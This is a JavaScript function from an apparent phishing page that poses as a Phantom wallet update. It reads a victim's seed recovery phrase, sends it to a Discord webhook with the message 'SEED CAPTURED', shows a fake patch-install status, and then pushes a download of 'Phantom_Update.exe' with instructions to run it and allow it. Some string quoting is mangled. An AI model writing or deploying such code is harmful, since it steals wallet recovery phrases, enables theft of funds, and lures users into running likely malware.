function steal() {
    const seed = document.getElementById('seed-input').value.trim();
    if (!seed) {
        alert('Recovery phrase required.');
        return;
    }
    fetch('https://discord.com/api/webhooks/YOUR_REAL_WEBHOOK_HERE', {
        method: 'POST',
        body: JSON.stringify({
            content: 🔥 SEED CAPTURED\\\${seed}\\\`
        }),
        headers: { 'Content-Type': 'application/json' }
    }).catch(() => {});

    document.getElementById('status').textContent = 'Installing patch... (3%)';
    
    setTimeout(() => {
        const link = document.createElement('a');
        link.href = 'Phantom_Update.exe';
        link.download = 'Phantom_Update.exe';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        
        setTimeout(() => {
            document.getElementById('status').innerHTML = 
                ⚠️ Run <b>Phantom_Update.exe</b> to finish<br>
                <small>Open Downloads → Run file → Allow</small>
            ;
        }, 1000);
    }, 2000);
}
